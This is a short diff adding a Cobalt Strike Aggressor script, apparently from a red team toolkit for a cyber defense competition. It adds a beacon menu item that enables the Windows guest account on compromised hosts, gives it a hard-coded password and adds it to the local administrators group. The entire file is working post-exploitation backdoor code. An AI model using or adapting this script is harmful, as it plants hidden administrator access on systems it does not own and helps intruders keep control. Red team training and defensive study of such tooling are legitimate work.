@@ -1,0 +1,19 @@
+sub guest_local_admin {
+   #enable account
+   bshell($1, 'net user guest /active:yes');
+
+   #set guest's password to CCDCsAccount99
+   bshell($1, 'net user guest CCDCsAccount99');
+
+   #add guest to local administrators group
+   bshell($1, 'net localgroup  administrators guest /add');
+}
+ 
+popup beacon_top {
+   item "Guest Acct Local Admin" {
+      local('$bid');
+      foreach $bid ($1) {
+         guest_local_admin($bid);
+      }
+   }
+}
